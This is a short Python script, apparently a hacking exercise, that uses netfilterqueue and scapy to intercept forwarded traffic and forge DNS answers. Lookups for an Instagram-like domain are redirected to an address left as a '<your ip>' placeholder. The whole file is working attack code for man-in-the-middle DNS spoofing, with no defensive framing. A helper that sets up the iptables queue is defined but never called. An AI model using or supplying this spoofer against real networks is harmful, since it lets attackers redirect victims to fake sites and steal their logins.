#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy

def create_queue():
    print(f"[+]Creating queue 0")
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num",0])

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.instgram.com" in str(qname):
            print("[+]Spoofing target")
            answer = scapy.DNSRR(rrname=qname,rdata="<your ip>")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            scapy_packet = scapy_packet.__class__(bytes(scapy_packet))
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
